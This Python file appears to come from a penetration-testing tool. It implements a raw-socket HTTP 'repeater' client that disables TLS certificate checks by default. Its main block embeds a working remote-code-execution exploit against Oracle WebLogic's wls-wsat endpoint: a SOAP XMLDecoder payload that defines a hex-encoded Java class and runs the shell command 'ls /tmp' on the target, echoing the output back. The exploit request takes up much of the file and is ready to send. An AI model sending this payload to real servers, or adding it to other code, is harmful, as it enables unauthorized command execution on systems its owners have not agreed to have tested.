import re
import socket
import ssl
from dataclasses import dataclass
from typing import Dict, Optional, Tuple, Union


@dataclass
class RawResponse:
    """原始HTTP响应结构"""

    ok: bool
    error: str
    resp: bytes

    def __bool__(self) -> bool:
        """支持 if response: 的用法"""
        return self.ok

    def text(self, encoding: str = "utf-8", errors: str = "replace") -> str:
        """将响应解码为文本"""
        return self.resp.decode(encoding, errors=errors)

    def status_line(self) -> str:
        """提取HTTP状态行"""
        if not self.ok:
            return ""
        try:
            first_line = self.resp.split(b"\r\n")[0]
            return first_line.decode("utf-8", errors="replace")
        except Exception:
            return ""


def _extract_host_and_port(raw: bytes) -> Optional[Tuple[str, Optional[int]]]:
    """从原始HTTP请求中提取Host头和端口

    返回:
        (host, port) 元组，port 可能为 None
        如果提取失败返回 None
    """
    try:
        lower = raw.lower()
        key = b"\r\nhost:"
        idx = lower.find(key)
        if idx == -1:
            return None

        start = idx + len(key)
        end = lower.find(b"\r\n", start)
        if end == -1:
            end = len(raw)

        host_value = raw[start:end].strip().decode()

        # 处理 IPv6 地址格式 [::1]:8080
        if host_value.startswith("["):
            bracket_end = host_value.find("]")
            if bracket_end != -1:
                host = host_value[1:bracket_end]
                port_part = host_value[bracket_end + 1 :]
                if port_part.startswith(":"):
                    try:
                        port = int(port_part[1:])
                        return (host, port)
                    except ValueError:
                        pass
                return (host, None)

        # 处理普通 host:port 格式
        if ":" in host_value:
            parts = host_value.rsplit(":", 1)  # 从右侧分割一次
            try:
                return (parts[0], int(parts[1]))
            except (ValueError, IndexError):
                pass

        return (host_value, None)
    except Exception:
        return None


def _parse_headers(header_bytes: bytes) -> Tuple[Dict[str, str], bytes]:
    """解析HTTP响应头"""
    headers = {}
    header_separator = b"\r\n\r\n"
    separator_index = header_bytes.find(header_separator)
    if separator_index == -1:
        header_part = header_bytes
        body_part = b""
    else:
        header_part = header_bytes[:separator_index]
        body_part = header_bytes[separator_index + len(header_separator) :]

    header_lines = re.split(b"\r\n", header_part)
    for line in header_lines[1:]:
        if b":" in line:
            key, value = line.split(b":", 1)
            headers[key.decode("utf-8").strip().lower()] = value.decode("utf-8").strip()

    return headers, body_part


def send_raw_request(
    raw_request: bytes,
    port: Optional[int] = None,
    host: Optional[str] = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 8,
    max_response_size: int = 3 * 1024 * 1024,
) -> RawResponse:
    """
    发送原始HTTP请求并接收响应
    """
    conn = None

    try:
        if not port or not host:
            host_port = _extract_host_and_port(raw_request)
            if not host_port:
                return RawResponse(
                    ok=False, error="Host header not found in request", resp=b""
                )
            if not port and not host_port[1]:
                port = 443 if use_ssl else 80
            elif not port:
                port = host_port[1]

            if not host and not host_port[0]:
                return RawResponse(ok=False, error="Host header error", resp=b"")
            elif not host:
                host = host_port[0]

        # 创建TCP连接
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except socket.timeout:
            return RawResponse(
                ok=False, error=f"Connection timeout to {host}:{port}", resp=b""
            )
        except socket.gaierror as e:
            return RawResponse(
                ok=False, error=f"DNS resolution failed for {host}: {str(e)}", resp=b""
            )
        except ConnectionRefusedError:
            return RawResponse(
                ok=False, error=f"Connection refused to {host}:{port}", resp=b""
            )
        except OSError as e:
            return RawResponse(ok=False, error=f"Network error: {str(e)}", resp=b"")

        # SSL包装
        if use_ssl:
            try:
                if verify_ssl:
                    context = ssl.create_default_context()
                else:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE

                conn = context.wrap_socket(sock, server_hostname=host)
            except ssl.SSLError as e:
                sock.close()
                return RawResponse(ok=False, error=f"SSL error: {str(e)}", resp=b"")
            except Exception as e:
                sock.close()
                return RawResponse(
                    ok=False, error=f"SSL handshake failed: {str(e)}", resp=b""
                )
        else:
            conn = sock

        try:
            conn.settimeout(timeout)
            conn.sendall(raw_request)
        except socket.timeout:
            return RawResponse(ok=False, error="Send timeout", resp=b"")
        except Exception as e:
            return RawResponse(ok=False, error=f"Send failed: {str(e)}", resp=b"")

        header_data = b""
        body_start = b""
        header_separator = b"\r\n\r\n"

        try:
            while header_separator not in header_data:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                header_data += chunk

                if len(header_data) > max_response_size:
                    return RawResponse(
                        ok=False,
                        error="Response headers too large or invalid",
                        resp=header_data,
                    )

            if header_separator in header_data:
                separator_index = header_data.find(header_separator)
                body_start = header_data[separator_index + len(header_separator) :]
                header_data = header_data[: separator_index + len(header_separator)]

        except socket.timeout:
            if not header_data:
                return RawResponse(
                    ok=False,
                    error="Timeout while waiting for response headers",
                    resp=b"",
                )
        headers, _ = _parse_headers(header_data)
        content_length_str = headers.get("content-length")
        content_length = (
            int(content_length_str)
            if content_length_str and content_length_str.isdigit()
            else None
        )

        response_parts = [header_data, body_start]
        total_received = len(header_data) + len(body_start)

        if content_length is not None:
            body_length_to_read = content_length - len(body_start)

            while body_length_to_read > 0:
                if total_received > max_response_size:
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )

                try:
                    chunk = conn.recv(min(body_length_to_read, 65536))
                    if not chunk:
                        break
                    response_parts.append(chunk)
                    body_length_to_read -= len(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    return RawResponse(
                        ok=False,
                        error="Timeout while receiving response body (Content-Length specified)",
                        resp=b"".join(response_parts),
                    )
                except Exception as e:
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )

        else:
            while True:
                if total_received > max_response_size:
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )
                try:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    response_parts.append(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    break
                except Exception as e:
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )

        response_data = b"".join(response_parts)

        if not response_data:
            return RawResponse(
                ok=False, error="No response received from server", resp=b""
            )

        return RawResponse(ok=True, error="", resp=response_data)

    except Exception as e:
        return RawResponse(ok=False, error=f"Unexpected error: {str(e)}", resp=b"")

    finally:
        if conn:
            try:
                # 无论如何，最后都关闭连接
                conn.close()
            except Exception:
                pass


def repeater(
    raw_request: Union[str, bytes],
    port: Optional[int] = None,
    host: Optional[str] = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 8,
    max_response_size: int = 3 * 1024 * 1024,
) -> RawResponse:
    """
    send_raw_request 的包装器：
    - 支持 str / bytes 输入
    - str 自动转换为 HTTP 原始请求格式
    """

    if isinstance(raw_request, str):
        # 先统一换行符为 \n，再统一转换为 \r\n
        raw_request = raw_request.replace("\r\n", "\n").replace("\r", "\n")
        raw_request = raw_request.replace("\n", "\r\n").encode("utf-8")
    return send_raw_request(
        raw_request=raw_request,
        port=port,
        host=host,
        use_ssl=use_ssl,
        verify_ssl=verify_ssl,
        timeout=timeout,
        max_response_size=max_response_size,
    )


if __name__ == "__main__":
    http_request_local = """POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.192.148:28689
Content-Type: text/xml;charset=UTF-8
Content-Length: 5367
User-Agent: Mozilla/5.0
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>
                </void>
                <void class="org.mozilla.classfile.DefiningClassLoader">
                    <void method="defineClass">
                        <string>com.supeream.exploits.XmlExp</string>
                        <object idref="cls"></object>
                        <void method="newInstance">
                            <void method="say" id="proc">
                                <string>ls /tmp</string>
                            </void>
                        </void>
                    </void>
                </void>
                <void class="java.lang.Thread" method="currentThread">
                    <void method="getCurrentWork">
                        <void method="getResponse">
                            <void method="getServletOutputStream">
                                <void method="writeStream">
                                    <object idref="proc"></object>
                                </void>
                                <void method="flush"/>
                            </void>
                            <void method="getWriter"><void method="write"><string></string></void></void>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
"""
    response_local = repeater(http_request_local)
    if response_local.ok:
        print(f"✓ 成功, 响应大小: {len(response_local.resp)} 字节")
        print(f"状态行: {response_local.status_line()}")
        print(f"\n响应预览:\n{response_local.text()}")
    else:
        print(f"✗ 失败: {response_local.error}")
